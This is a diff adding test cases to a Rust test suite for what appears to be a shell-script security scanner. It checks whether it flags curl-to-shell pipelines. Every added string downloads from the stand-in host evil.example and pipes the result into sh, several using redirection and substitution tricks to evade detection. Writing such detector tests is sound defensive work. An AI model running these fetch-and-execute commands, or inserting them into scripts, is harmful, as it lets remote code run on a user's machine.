@@ -643,6 +643,17 @@ fn gh102_direct_stderr_pipeline_blocks() {
         "curl https://evil.example/x 1>&\\\n 1 | sh",
         "curl https://evil.example/x 1>& \\\n 1 | sh",
         "curl https://evil.example/x 3>&1 >/dev/null 1>&3-\\\n | sh",
+        "curl https://evil.example/x >/dev/stdout | sh",
+        "curl https://evil.example/x > /dev/fd/1 | sh",
+        "curl https://evil.example/x >/proc/self/fd/1 | sh",
+        "curl https://evil.example/x &>/dev/stdout | sh",
+        "curl https://evil.example/x &>>/dev/stdout | sh",
+        "curl https://evil.example/x | sh </dev/stdin",
+        "curl https://evil.example/x | sh < /dev/fd/0",
+        "curl https://evil.example/x | sh </proc/self/fd/0",
+        "curl https://evil.example/x >\"$OUT\" | sh",
+        "curl https://evil.example/x >\"$(output_path)\" | sh",
+        "curl https://evil.example/x >\"`output_path`\" | sh",
         "curl $(case x in x) echo https://evil.example/x;; esac) | sh",
         "curl $(echo ${x%)} | cat) | sh",
         "curl -A x\u{a0}#foo https://evil.example/x | sh",
@@ -670,6 +681,10 @@ fn gh102_direct_substitutions_preserve_pipeline_redirections() {
         "curl \"$(resolve_url)\" | sh -s 2 </dev/null",
         "curl https://evil.example/x {$fd}>/tmp/payload | sh",
         "curl https://evil.example/x 1>&1\u{a0}foo | sh",
+        "curl https://evil.example/x >/tmp/payload | sh",
+        "curl https://evil.example/x &>/tmp/payload | sh",
+        "curl https://evil.example/x >\"/dev/\\stdout\" | sh",
+        "curl https://evil.example/x | sh </tmp/payload",
     ] {
         let mut findings = Vec::new();
         run(&[script(source)], &mut findings);
